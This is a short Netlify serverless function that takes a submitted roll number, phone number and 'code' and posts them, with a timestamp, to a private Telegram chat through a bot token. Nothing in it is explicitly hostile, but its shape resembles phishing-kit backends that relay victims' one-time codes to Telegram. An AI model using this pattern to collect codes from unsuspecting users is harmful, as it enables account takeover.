// netlify/functions/send.js
const fetch = require('node-fetch');

exports.handler = async (event) => {
    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    try {
        // Parse the request body
        const { roll, number, code } = JSON.parse(event.body);

        // Validate required fields
        if (!roll || !number || !code) {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Missing required fields' })
            };
        }

        // Get environment variables
        const BOT_TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing BOT_TOKEN or CHAT_ID environment variables');
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Server configuration error' })
            };
        }

        // Prepare message for Telegram
        const message = `🔔 *New Result Request*\n━━━━━━━━━━━━━━━━\n📋 *Roll:* \`${roll}\`\n🔢 *Number:* \`${number}\`\n🔑 *Code:* \`${code}\`\n⏰ *Time:* ${new Date().toLocaleString('en-IN')}\n━━━━━━━━━━━━━━━━`;

        // Send to Telegram
        const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const telegramData = await telegramResponse.json();

        if (telegramData.ok) {
            return {
                statusCode: 200,
                body: JSON.stringify({ success: true })
            };
        } else {
            console.error('Telegram API error:', telegramData);
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Failed to send message to Telegram' })
            };
        }

    } catch (error) {
        console.error('Netlify Function error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal server error' })
        };
    }
};
